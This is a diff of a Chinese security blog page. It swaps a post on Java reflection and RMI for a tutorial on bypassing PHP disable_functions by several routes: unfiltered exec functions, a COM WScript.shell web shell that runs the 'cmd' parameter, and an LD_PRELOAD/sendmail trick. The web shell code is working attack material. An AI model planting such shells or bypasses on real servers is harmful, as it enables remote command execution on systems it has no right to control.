@@ -7,7 +7,7 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>java学习二java机制 | Hexo</title>
+  <title>bypass_disable_func | Hexo</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,17 +15,21 @@
     <meta name="keywords" content="web安全，app安全，咸鱼">
   
 
-  <meta name="description" content="类加载机制反射java.lang.class​        Class类是反射中的核心类，Java中每个类都有一个相对应的Class类的对象，类是class类的实例对象，JVM加载类时会创建一个该类的Class类对象。 ​        实现反射第一步就是获取class 12345class.class int.classClass.forName(&amp;quot;class&amp;quot;)class">
+  <meta name="description" content="disable_functionsdisable_function可以用来禁用php函数。disable_functions = system这样就禁用了system函数。 绕过漏网之鱼首先看对方的禁止是否全面。 1assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)  这是所有php执行命令的方法(网">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java学习二java机制">
-<meta property="og:url" content="http://yoursite.com/2020/02/27/java学习二/index.html">
+<meta property="og:title" content="bypass_disable_func">
+<meta property="og:url" content="http://yoursite.com/2020/03/13/bypass-disable-func/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="类加载机制反射java.lang.class​        Class类是反射中的核心类，Java中每个类都有一个相对应的Class类的对象，类是class类的实例对象，JVM加载类时会创建一个该类的Class类对象。 ​        实现反射第一步就是获取class 12345class.class int.classClass.forName(&amp;quot;class&amp;quot;)class">
+<meta property="og:description" content="disable_functionsdisable_function可以用来禁用php函数。disable_functions = system这样就禁用了system函数。 绕过漏网之鱼首先看对方的禁止是否全面。 1assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)  这是所有php执行命令的方法(网">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-03-02T12:59:29.115Z">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/bypass-disable-func/1584071682129.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/bypass-disable-func/1584071702609.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/bypass-disable-func/1584071729727.png">
+<meta property="og:updated_time" content="2020-03-13T03:55:51.585Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="java学习二java机制">
-<meta name="twitter:description" content="类加载机制反射java.lang.class​        Class类是反射中的核心类，Java中每个类都有一个相对应的Class类的对象，类是class类的实例对象，JVM加载类时会创建一个该类的Class类对象。 ​        实现反射第一步就是获取class 12345class.class int.classClass.forName(&amp;quot;class&amp;quot;)class">
+<meta name="twitter:title" content="bypass_disable_func">
+<meta name="twitter:description" content="disable_functionsdisable_function可以用来禁用php函数。disable_functions = system这样就禁用了system函数。 绕过漏网之鱼首先看对方的禁止是否全面。 1assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)  这是所有php执行命令的方法(网">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/13/bypass-disable-func/1584071682129.png">
 
   
 
@@ -184,20 +188,20 @@ ga('send', 'pageview');
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#类加载机制"><span class="toc-text">类加载机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反射"><span class="toc-text">反射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#java-lang-class"><span class="toc-text">java.lang.class</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI"><span class="toc-text">RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jndi"><span class="toc-text">jndi</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#disable-functions"><span class="toc-text">disable_functions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏网之鱼"><span class="toc-text">漏网之鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#组件漏洞"><span class="toc-text">组件漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#com组件绕过"><span class="toc-text">com组件绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件"><span class="toc-text">条件:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-text">LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件-1"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-text">利用</span></a></li></ol></li></ol></li></ol>
   </div>
 
 
 
 <div class="content content-post CENTER">
-   <article id="post-java学习二" class="article article-type-post" itemprop="blogPost">
+   <article id="post-bypass-disable-func" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">java学习二java机制</h1>
+    <h1 class="post-title">bypass_disable_func</h1>
 
     <div class="article-meta">
       <span>
         <i class="icon-calendar"></i>
-        <span>2020.02.27</span>
+        <span>2020.03.13</span>
       </span>
 
       
@@ -225,25 +229,30 @@ ga('send', 'pageview');
 
   <div class="article-content">
     
-      <h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="java-lang-class"><a href="#java-lang-class" class="headerlink" title="java.lang.class"></a>java.lang.class</h3><p>​        Class类是反射中的核心类，Java中每个类都有一个相对应的Class类的对象，类是class类的实例对象，JVM加载类时会创建一个该类的Class类对象。</p>
-<p>​        实现反射第一步就是获取class</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class.class int.class</span><br><span class="line">Class.forName(&quot;class&quot;)class表实class的全路径</span><br><span class="line">class.getClass()这里的class是实例化后的对象</span><br><span class="line">ClassLoader.loadClass(class，false)class表实class的全路径,false表示是不链接意味着不进行包括初始化等一些列步骤，那么静态块和静态对象就不会得到执行</span><br><span class="line">this.getClass().getClassLoader.loadClass(class，false)</span><br></pre></td></tr></table></figure>
+      <h1 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h1><p>disable_function可以用来禁用php函数。disable_functions = system这样就禁用了system函数。</p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="漏网之鱼"><a href="#漏网之鱼" class="headerlink" title="漏网之鱼"></a>漏网之鱼</h2><p>首先看对方的禁止是否全面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)</span><br></pre></td></tr></table></figure>
 
-<p>​        以上是获取class的方法,得到的class有几个关键方法：</p>
-<p>​        newInstance实例化class方便使用</p>
-<p>​        getMethod(方法名,参数)获取方法Method a1=a.getMethod(‘exec’,String class)获取exec方法</p>
-<p>​        invoke(对象,参数)使用方法，这里使用前面的a1，a1.invoke(calzz,”calc.exe”)第一个参数是方法所在的对象，后面是参数，参数个数与类型与getMethod所写的保持一致。</p>
-<p>​        getConstructor()当无无参构造函数时使用，使用clazz.getConstructor(构造函数参数类型.class).newInstance()来生成对象</p>
-<p>​        getDeclaredConstructor()当构造函数私有时使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(true);必须修改构造函数作用域否则无法使用。</span><br></pre></td></tr></table></figure>
+<p>这是所有php执行命令的方法(网上搬的，不知道对不对)，遇到网上翻一翻，百度翻两页没有找到没过滤的就基本没有了。</p>
+<h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><p>利用phpinfo()查看服务器的配置信息，看是否存在有漏洞的组件。</p>
+<h2 id="com组件绕过"><a href="#com组件绕过" class="headerlink" title="com组件绕过"></a>com组件绕过</h2><p>安全模式也可以使用，安全模式没有禁止这个配置。</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件:"></a>条件:</h3><p>windows,应为COM组件是windows的组件。</p>
+<p>COM要能够启动。</p>
+<p>php.ini中com.allow_dcom = true，大于5.4的版本需要设置extension=php_com_dotnet.dll(具体最小什么版本不清楚但是我5.4.45就需要了)</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>具备条件后，上传到服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command = $_GET[&apos;cmd&apos;];</span><br><span class="line">$wsh = new COM(&apos;WScript.shell&apos;); // 生成一个COM对象 Shell.Application也能</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz), &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>上面的是最常见的java命令执行代码，创建Runtime的class类类型，获取exec方法,通过Runtime的getRuntime()方法获取Runtime的对象(因为Runtime的构造方法是私有的)，再执行exec函数.</p>
-<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI简单来说就是一个可以将一个程序写在两个服务器，一个服务器可以调用另一个服务器的方法。</p>
-<p>引用别人的一段话：</p>
-<p>RMI由3个部分构成，第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下），第二个是server端的程序，对外提供远程对象，第三个是client端的程序，想要调用远程对象的方法。<br>首先，先启动rmiregistry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。<br>其次，server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到rmiregistry上并对外暴露一个名称。<br>最后，client端通过本地的接口和一个已知的名称（即rmiregistry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMIService那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。<a href="https://blog.csdn.net/qq_28081453/article/details/83279066" target="_blank" rel="noopener">原文</a>我觉得作者对rmi描述的很清楚了。</p>
-<h2 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。就是一个可以实现rmi，数据库，ladp等的api接口。</p>
+<p>访问,执行成功。</p>
+<p><img src="/2020/03/13/bypass-disable-func/1584071682129.png" alt="1584071682129"></p>
+<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>要有sendmail(我后面卸载了sendmail也行，不知道是不是卸载干净了)，apt-get remove卸载的又重启了ubuntu。</p>
+<p>使用cli的php.ini(这里不知道两个具体区别，有空下载下来对照下。)</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>原理可以参考<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>访问</p>
+<p><img src="/2020/03/13/bypass-disable-func/1584071702609.png" alt="1584071702609"></p>
+<p>结果</p>
+<p><img src="/2020/03/13/bypass-disable-func/1584071729727.png" alt="1584071729727"></p>
+<p>这里不知道什么未知原因直接从浏览器访问不行，只有将参数写入文件，终端用php命令才行访问文件才行。后面查了下是由于使用的php.ini不一样浏览器访问使用的fpm而终端使用的cli，我把cli的php.ini复制给fpm复现成功。</p>
+<p>目前来说就这三个我感觉好用一点，mod_cgi执行之类的感觉意义不大，就是一个研究目的。</p>
 
     
   </div>
@@ -255,10 +264,10 @@ ga('send', 'pageview');
 
    
   <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2020/02/27/java代码安全/">
+    <a class="show pull-left" href="/2020/03/06/java学习java框架/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2020/03/02/poc整理/">
+    <a class="hide pull-right" href="/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
